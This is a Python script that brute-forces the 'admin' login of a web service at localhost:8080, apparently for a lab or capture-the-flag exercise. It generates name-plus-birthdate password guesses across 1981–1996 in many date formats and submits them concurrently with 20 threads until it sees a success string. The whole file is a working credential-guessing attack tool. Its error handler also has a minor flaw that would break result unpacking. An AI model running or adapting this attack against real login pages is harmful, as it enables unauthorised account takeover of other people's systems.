import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

names = ['alice', 'bob', 'carol', 'eve']


url = "http://localhost:8080/login"


start_date = datetime(1981, 1, 1)
end_date = datetime(1996, 12, 31)
delta = timedelta(days=1)


# name + YYYY-MM-DD
# name + YYYYMMDD

# name + MM-DD
# name + MMDD

# name + YYYY-DDD
# name + YYYYDDD

#name + YYYY-Www-D
#name + YYYYWwwD


# YYYY-MM-DD + name
# YYYYMMDD + name

# MM-DD + name
# MMDD + name

# YYYY-DDD + name
# YYYYDDD + name

#YYYY-Www-D + name
#YYYYWwwD + name

# Generate all combinations of names and dates



def try_login(password):
    data = {
        'username': 'admin',
        'password': password
    }
    try:
        response = requests.post(url, data=data)
        return password, response.text
    except requests.exceptions.RequestException as e:
        return password

# Generate all combinations of names and dates
current_date = start_date
password_attempts = []

while current_date <= end_date:
    iso_date = current_date.strftime("%Y-%m-%d")
    for name in names:
        # Generate different password formats
        passwords = [
            f"{name}{iso_date}",
            f"{name}{current_date.strftime('%Y%m%d')}",
            f"{name}{current_date.strftime('%m-%d')}",
            f"{name}{current_date.strftime('%m%d')}",
            f"{name}{current_date.strftime('%Y-%j')}",  # YYYY-DDD
            f"{name}{current_date.strftime('%Y%j')}",   # YYYYDDD
            f"{name}{current_date.strftime('%Y-W%V-%u')}",  # YYYY-Www-D
            f"{current_date.strftime('%Y-%m-%d')}{name}",
            f"{current_date.strftime('%Y%m%d')}{name}",
            f"{current_date.strftime('%m-%d')}{name}",
            f"{current_date.strftime('%m%d')}{name}",
            f"{current_date.strftime('%Y-%j')}{name}",  # YYYY-DDD
            f"{current_date.strftime('%Y%j')}{name}",   # YYYYDDD
            f"{current_date.strftime('%Y-W%V-%u')}{name}",  # YYYY-Www-D
        ]
        
        password_attempts.extend(passwords)

    # Increment date
    current_date += delta

# Use ThreadPoolExecutor to try passwords concurrently
with ThreadPoolExecutor(max_workers=20) as executor:  # Adjust the number of workers as needed
    future_to_password = {executor.submit(try_login, password): password for password in password_attempts}
    
    for future in as_completed(future_to_password):
        password, response_text = future.result()
        print(f"[*] Trying password: '{password}'")
        #print(response_text)
        if "ACCESS GRANTED" in response_text:  # Adjust this condition based on the actual success response
            print(f"[+] Found valid password: '{password}'")
            break